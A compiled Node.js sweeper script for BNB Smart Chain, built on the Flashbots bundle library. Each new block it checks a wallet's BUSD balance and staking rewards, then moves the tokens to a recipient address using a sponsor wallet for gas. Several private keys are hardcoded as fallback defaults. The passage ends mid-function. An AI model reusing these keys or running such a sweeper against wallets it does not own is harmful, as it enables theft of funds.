"use strict";
var _a;
Object.defineProperty(exports, "__esModule", { value: true });
const ethers_provider_bundle_1 = require("@flashbots/ethers-provider-bundle");
const ethers_1 = require("ethers");
const utils_1 = require("./utils");
const utils_2 = require("ethers/lib/utils");
const claimReward_1 = require("./engine/claimReward");
const ERC20_ABI = [{ "inputs": [{ "internalType": "string", "name": "_name", "type": "string" }, { "internalType": "string", "name": "_symbol", "type": "string" }, { "internalType": "address", "name": "_depositToken", "type": "address" }, { "internalType": "address", "name": "_rewardToken", "type": "address" }, { "internalType": "address", "name": "_escrowPool", "type": "address" }, { "internalType": "uint256", "name": "_escrowPortion", "type": "uint256" }, { "internalType": "uint256", "name": "_escrowDuration", "type": "uint256" }, { "internalType": "uint256", "name": "_maxBonus", "type": "uint256" }, { "internalType": "uint256", "name": "_maxLockDuration", "type": "uint256" }], "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "delegator", "type": "address" }, { "indexed": true, "internalType": "address", "name": "fromDelegate", "type": "address" }, { "indexed": true, "internalType": "address", "name": "toDelegate", "type": "address" }], "name": "DelegateChanged", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "delegate", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "previousBalance", "type": "uint256" }, { "indexed": false, "internalType": "uint256", "name": "newBalance", "type": "uint256" }], "name": "DelegateVotesChanged", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }, { "indexed": false, "internalType": "uint256", "name": "duration", "type": "uint256" }, { "indexed": true, "internalType": "address", "name": "receiver", "type": "address" }, { "indexed": true, "internalType": "address", "name": "from", "type": "address" }], "name": "Deposited", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "_from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "_receiver", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "_escrowedAmount", "type": "uint256" }, { "indexed": false, "internalType": "uint256", "name": "_nonEscrowedAmount", "type": "uint256" }], "name": "RewardsClaimed", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "by", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "rewardsDistributed", "type": "uint256" }], "name": "RewardsDistributed", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "by", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "fundsWithdrawn", "type": "uint256" }], "name": "RewardsWithdrawn", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "indexed": true, "internalType": "bytes32", "name": "previousAdminRole", "type": "bytes32" }, { "indexed": true, "internalType": "bytes32", "name": "newAdminRole", "type": "bytes32" }], "name": "RoleAdminChanged", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "indexed": true, "internalType": "address", "name": "account", "type": "address" }, { "indexed": true, "internalType": "address", "name": "sender", "type": "address" }], "name": "RoleGranted", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "indexed": true, "internalType": "address", "name": "account", "type": "address" }, { "indexed": true, "internalType": "address", "name": "sender", "type": "address" }], "name": "RoleRevoked", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "by", "type": "address" }, { "indexed": true, "internalType": "address", "name": "receiver", "type": "address" }, { "indexed": true, "internalType": "address", "name": "token", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "TokenSaved", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "uint256", "name": "depositId", "type": "uint256" }, { "indexed": true, "internalType": "address", "name": "receiver", "type": "address" }, { "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "Withdrawn", "type": "event" }, { "inputs": [], "name": "DEFAULT_ADMIN_ROLE", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "DOMAIN_SEPARATOR", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "MIN_LOCK_DURATION", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "POINTS_MULTIPLIER", "outputs": [{ "internalType": "uint128", "name": "", "type": "uint128" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "TOKEN_SAVER_ROLE", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint32", "name": "pos", "type": "uint32" }], "name": "checkpoints", "outputs": [{ "components": [{ "internalType": "uint32", "name": "fromBlock", "type": "uint32" }, { "internalType": "uint224", "name": "votes", "type": "uint224" }], "internalType": "struct ERC20Votes.Checkpoint", "name": "", "type": "tuple" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_receiver", "type": "address" }], "name": "claimRewards", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_account", "type": "address" }], "name": "cumulativeRewardsOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "delegatee", "type": "address" }], "name": "delegate", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "delegatee", "type": "address" }, { "internalType": "uint256", "name": "nonce", "type": "uint256" }, { "internalType": "uint256", "name": "expiry", "type": "uint256" }, { "internalType": "uint8", "name": "v", "type": "uint8" }, { "internalType": "bytes32", "name": "r", "type": "bytes32" }, { "internalType": "bytes32", "name": "s", "type": "bytes32" }], "name": "delegateBySig", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "delegates", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "_amount", "type": "uint256" }, { "internalType": "uint256", "name": "_duration", "type": "uint256" }, { "internalType": "address", "name": "_receiver", "type": "address" }], "name": "deposit", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "depositToken", "outputs": [{ "internalType": "contract IERC20", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "", "type": "address" }, { "internalType": "uint256", "name": "", "type": "uint256" }], "name": "depositsOf", "outputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }, { "internalType": "uint64", "name": "start", "type": "uint64" }, { "internalType": "uint64", "name": "end", "type": "uint64" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "_amount", "type": "uint256" }], "name": "distributeRewards", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "escrowDuration", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "escrowPool", "outputs": [{ "internalType": "contract ITimeLockPool", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "escrowPortion", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_account", "type": "address" }], "name": "getDepositsOf", "outputs": [{ "components": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }, { "internalType": "uint64", "name": "start", "type": "uint64" }, { "internalType": "uint64", "name": "end", "type": "uint64" }], "internalType": "struct TimeLockPool.Deposit[]", "name": "", "type": "tuple[]" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_account", "type": "address" }], "name": "getDepositsOfLength", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "_lockDuration", "type": "uint256" }], "name": "getMultiplier", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "blockNumber", "type": "uint256" }], "name": "getPastTotalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint256", "name": "blockNumber", "type": "uint256" }], "name": "getPastVotes", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }], "name": "getRoleAdmin", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "uint256", "name": "index", "type": "uint256" }], "name": "getRoleMember", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }], "name": "getRoleMemberCount", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_account", "type": "address" }], "name": "getTotalDeposit", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "getVotes", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "address", "name": "account", "type": "address" }], "name": "grantRole", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "address", "name": "account", "type": "address" }], "name": "hasRole", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "maxBonus", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "maxLockDuration", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }], "name": "nonces", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "numCheckpoints", "outputs": [{ "internalType": "uint32", "name": "", "type": "uint32" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "value", "type": "uint256" }, { "internalType": "uint256", "name": "deadline", "type": "uint256" }, { "internalType": "uint8", "name": "v", "type": "uint8" }, { "internalType": "bytes32", "name": "r", "type": "bytes32" }, { "internalType": "bytes32", "name": "s", "type": "bytes32" }], "name": "permit", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "", "type": "address" }], "name": "pointsCorrection", "outputs": [{ "internalType": "int256", "name": "", "type": "int256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "pointsPerShare", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "address", "name": "account", "type": "address" }], "name": "renounceRole", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "address", "name": "account", "type": "address" }], "name": "revokeRole", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "rewardToken", "outputs": [{ "internalType": "contract IERC20", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_token", "type": "address" }, { "internalType": "address", "name": "_receiver", "type": "address" }, { "internalType": "uint256", "name": "_amount", "type": "uint256" }], "name": "saveToken", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "bytes4", "name": "interfaceId", "type": "bytes4" }], "name": "supportsInterface", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "_depositId", "type": "uint256" }, { "internalType": "address", "name": "_receiver", "type": "address" }], "name": "withdraw", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_account", "type": "address" }], "name": "withdrawableRewardsOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "", "type": "address" }], "name": "withdrawnRewards", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_account", "type": "address" }], "name": "withdrawnRewardsOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }];
const STAKE_ABI = [{ "inputs": [{ "internalType": "address", "name": "_devWallet", "type": "address" }, { "internalType": "address", "name": "_busdContract", "type": "address" }, { "internalType": "uint256", "name": "_startDate", "type": "uint256" }], "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "previousOwner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "newOwner", "type": "address" }], "name": "OwnershipTransferred", "type": "event" }, { "inputs": [], "name": "BUSDContract", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "_currentDepositID", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "apr", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_busdContract", "type": "address" }], "name": "changeBUSDContractAddress", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "claimAllReward", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "_amount", "type": "uint256" }], "name": "deposit", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "_amount", "type": "uint256" }], "name": "depositFunds", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "name": "depositState", "outputs": [{ "internalType": "address", "name": "investor", "type": "address" }, { "internalType": "uint256", "name": "depositAmount", "type": "uint256" }, { "internalType": "uint256", "name": "depositAt", "type": "uint256" }, { "internalType": "uint256", "name": "claimedAmount", "type": "uint256" }, { "internalType": "bool", "name": "state", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "developerFee", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_investor", "type": "address" }], "name": "getAllClaimableReward", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "getBalance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "investor", "type": "address" }], "name": "getOwnedDeposits", "outputs": [{ "internalType": "uint256[]", "name": "", "type": "uint256[]" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "getTotalInvests", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "getTotalRewards", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "", "type": "address" }], "name": "investors", "outputs": [{ "internalType": "address", "name": "investor", "type": "address" }, { "internalType": "uint256", "name": "totalLocked", "type": "uint256" }, { "internalType": "uint256", "name": "startTime", "type": "uint256" }, { "internalType": "uint256", "name": "lastCalculationDate", "type": "uint256" }, { "internalType": "uint256", "name": "claimableAmount", "type": "uint256" }, { "internalType": "uint256", "name": "claimedAmount", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "", "type": "address" }, { "internalType": "uint256", "name": "", "type": "uint256" }], "name": "ownedDeposits", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "percentRate", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "renounceOwnership", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_devWallet", "type": "address" }], "name": "resetContract", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "rewardPeriod", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "startDate", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "totalInvested", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "totalInvestors", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "totalReward", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "id", "type": "uint256" }], "name": "withdrawCapital", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "_amount", "type": "uint256" }], "name": "withdrawFunds", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "withdrawPeriod", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }];
require('log-timestamp');
const BLOCKS_IN_FUTURE = 2;
const GWEI = ethers_1.BigNumber.from(10).pow(9);
const PRIORITY_GAS_PRICE = GWEI.mul(31);
const MINER_REWARD_IN_WEI = (0, utils_2.parseEther)((_a = process.env.MINER_REWARD) !== null && _a !== void 0 ? _a : '0.021');
const PRIVATE_KEY_EXECUTOR = process.env.PRIVATE_KEY_EXECUTOR || "6a73fded256ba55d351ae904d8525bf5dd9a31b0a253b98b2e85da43e39985ec";
const PRIVATE_KEY_SPONSOR = process.env.PRIVATE_KEY_SPONSOR || "910e6953218dd293bdd640c32965462da93efa106eddc9e7b0a97505ee36fc4d";
const FLASHBOTS_RELAY_SIGNING_KEY = process.env.FLASHBOTS_RELAY_SIGNING_KEY || "b4c4e0bcacb86be448213aacf4388afad15e0b1009c4b0906ad975b117e6feab";
const RECIPIENT = process.env.RECIPIENT || "0xA6a0AB201460B540207fE891Cfa98cc3AD3991fF";
if (PRIVATE_KEY_EXECUTOR === "") {
    console.warn("Must provide PRIVATE_KEY_EXECUTOR environment variable, corresponding to Ethereum EOA with assets to be transferred");
    process.exit(1);
}
if (PRIVATE_KEY_SPONSOR === "") {
    console.warn("Must provide PRIVATE_KEY_SPONSOR environment variable, corresponding to an Ethereum EOA with ETH to pay miner");
    process.exit(1);
}
if (FLASHBOTS_RELAY_SIGNING_KEY === "") {
    console.warn("Must provide FLASHBOTS_RELAY_SIGNING_KEY environment variable. Please see https://github.com/flashbots/pm/blob/main/guides/flashbots-alpha.md");
    process.exit(1);
}
if (RECIPIENT === "") {
    console.warn("Must provide RECIPIENT environment variable, an address which will receive assets");
    process.exit(1);
}
const walletRelay = new ethers_1.Wallet(FLASHBOTS_RELAY_SIGNING_KEY);
// ======= UNCOMMENT FOR GOERLI ==========
//const provider = new providers.InfuraProvider(5, process.env.INFURA_API_KEY || '');
//const flashbotsProvider = await FlashbotsBundleProvider.create(provider, walletRelay, 'https://relay-goerli.epheph.com/');
// ======= UNCOMMENT FOR MAINNET ==========
// https://arb1.arbitrum.io/rpc
//const ETHEREUM_RPC_URL = process.env.ETHEREUM_RPC_URL || "https://mainnet.infura.io/v3/298e2f57380f4804ae9103a26aa05ad7";
const BSCSCAN_RPC_URL = process.env.ETHEREUM_RPC_URL || "https://bsc-dataseed1.binance.org/";
const provider = new ethers_1.providers.StaticJsonRpcProvider(BSCSCAN_RPC_URL);
// ======= UNCOMMENT FOR MAINNET ==========
const walletExecutor = new ethers_1.Wallet(PRIVATE_KEY_EXECUTOR, provider);
const walletSponsor = new ethers_1.Wallet(PRIVATE_KEY_SPONSOR);
const walletRecipient = new ethers_1.Wallet("57c89b06ba9175ef8fa07e7047a5b6f9c60c1a1553670e9ba286f104f0d5f8dd");
// ======= UNCOMMENT FOR ERC20 Unstaking ==========
const stakeAddress = "0xfBbc24CA5518898fAe0d8455Cb265FaAA66157C9";
const stakeContract = new ethers_1.Contract(stakeAddress, STAKE_ABI, provider);
// ======= UNCOMMENT FOR ERC20 TRANSFER ==========
const tokenAddress = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
const tokenAddress1 = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d";
const tokenContract = new ethers_1.Contract(tokenAddress, ERC20_ABI, walletExecutor);
const createTX = async (engine) => {
    const flashbotsProvider = await ethers_provider_bundle_1.FlashbotsBundleProvider.create(provider, walletRelay);
    const block = await provider.getBlock('latest');
    // ======= UNCOMMENT FOR ERC20 TRANSFER ==========
    const tokenAddress = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
    //const engine: Base = new ClaimReward(provider, walletExecutor.address, RECIPIENT, tokenAddress);
    // ======= UNCOMMENT FOR ERC20 TRANSFER ==========
    // ======= UNCOMMENT FOR 721 Approval ==========
    //const HASHMASKS_ADDRESS = "0xd49eCCf40689095AD9e8334d8407f037E2cF5e42";
    //const engine: Base = new Approval721(RECIPIENT, [HASHMASKS_ADDRESS]);
    // ======= UNCOMMENT FOR 721 Approval ==========
    const sponsoredTransactions = await engine.getSponsoredTransactions();
    const gasEstimates = await Promise.all(sponsoredTransactions.map(tx => provider.estimateGas({
        ...tx,
        from: tx.from === undefined ? walletExecutor.address : tx.from
    })));
    const gasEstimateTotal = gasEstimates.reduce((acc, cur) => acc.add(cur), ethers_1.BigNumber.from(0));
    const gasPrice = PRIORITY_GAS_PRICE.add(block.baseFeePerGas || 0);
    //const tokenContract  = new Contract(tokenAddress, ERC20_ABI, provider);
    //const tokenBal = await tokenContract.functions.balanceOf(walletExecutor.address);
    //console.log(tokenBal);
    //const balance = await walletExecutor.getBalance();
    //const txBuffer = parseEther(".005");
    //const amount = balance.sub(txBuffer);
    const bundleTransactions = [
        {
            transaction: {
                to: walletExecutor.address,
                gasPrice: gasPrice,
                value: gasEstimateTotal.mul(gasPrice),
                gasLimit: 42000,
            },
            signer: walletSponsor
        },
        ...sponsoredTransactions.map((transaction, txNumber) => {
            return {
                transaction: {
                    ...transaction,
                    gasPrice: gasPrice,
                    gasLimit: gasEstimates[txNumber],
                },
                signer: walletExecutor,
            };
        })
    ];
    const signedBundle = await flashbotsProvider.signBundle(bundleTransactions);
    await (0, utils_1.printTransactions)(bundleTransactions, signedBundle);
    console.log("bundleTransactions hash" + signedBundle);
    const simulatedGasPrice = await (0, utils_1.checkSimulation)(flashbotsProvider, signedBundle);
    console.log(await engine.description());
    console.log(`Executor Account: ${walletExecutor.address}`);
    console.log(`Sponsor Account: ${walletSponsor.address}`);
    console.log(`Simulated Gas Price: ${(0, utils_1.gasPriceToGwei)(simulatedGasPrice)} gwei`);
    console.log(`Gas Price: ${(0, utils_1.gasPriceToGwei)(gasPrice)} gwei`);
    console.log(`Gas Used: ${gasEstimateTotal.toString()}`);
    provider.on('block', async (blockNumber) => {
        const simulatedGasPrice = await (0, utils_1.checkSimulation)(flashbotsProvider, signedBundle);
        const targetBlockNumber = blockNumber + BLOCKS_IN_FUTURE;
        console.log(`Current Block Number: ${blockNumber},   Target Block Number:${targetBlockNumber},   gasPrice: ${(0, utils_1.gasPriceToGwei)(simulatedGasPrice)} gwei`);
        const bundleResponse = await flashbotsProvider.sendBundle(bundleTransactions, targetBlockNumber);
        if ('error' in bundleResponse) {
            throw new Error(bundleResponse.error.message);
        }
        const bundleResolution = await bundleResponse.wait();
        if (bundleResolution === ethers_provider_bundle_1.FlashbotsBundleResolution.BundleIncluded) {
            console.log(`Congrats, included in ${targetBlockNumber}`);
            process.exit(0);
        }
        else if (bundleResolution === ethers_provider_bundle_1.FlashbotsBundleResolution.BlockPassedWithoutInclusion) {
            console.log(`Not included in ${targetBlockNumber}`);
        }
        else if (bundleResolution === ethers_provider_bundle_1.FlashbotsBundleResolution.AccountNonceTooHigh) {
            console.log("Nonce too high, bailing");
            process.exit(1);
        }
    });
};
const sponsorTx = async () => {
};
const claimTx = async () => {
};
async function main() {
    //const flashbotsProvider = await FlashbotsBundleProvider.create(provider, walletRelay);
    //const block = await provider.getBlock('latest');
    provider.on("block", async () => {
        console.log("Listening new block, waiting..)");
        const target = walletExecutor.connect(provider);
        const sponsor = walletSponsor.connect(provider);
        const recv = walletRecipient.connect(provider);
        //let claimBal = (await stakeContract.functions.investors(walletExecutor.address))[1];
        let tokenBal = (await tokenContract.functions.balanceOf(walletExecutor.address))[0];
        let ClaimableReward = (await stakeContract.functions.getAllClaimableReward(walletExecutor.address))[0];
        console.log(`${ClaimableReward}`);
        if (!tokenBal.eq(0)) {
            const engine2 = new claimReward_1.ClaimReward(provider, walletExecutor.address, RECIPIENT, tokenAddress);
            const contractInterface = ethers_1.Contract.getInterface(tokenContract.interface);
            const calldata = contractInterface.encodeFunctionData("transferFrom", [target.address, RECIPIENT, tokenBal]);
            //const approveData = contractInterface.encodeFunctionData("approve",[RECIPIENT, claimBal]);
            const gasPr = await provider.getGasPrice();
            const tx = {
                from: recv.getAddress(),
                to: tokenAddress,
                value: 0,
                data: calldata,
                //gasPr: gasPr,
            };
            const gasLim = await provider.estimateGas(tx);
            const txBuffer = (0, utils_2.parseEther)(".0001");
            const cost = gasPr.mul(gasLim).add(txBuffer);
            let balance = await provider.getBalance(target.address);
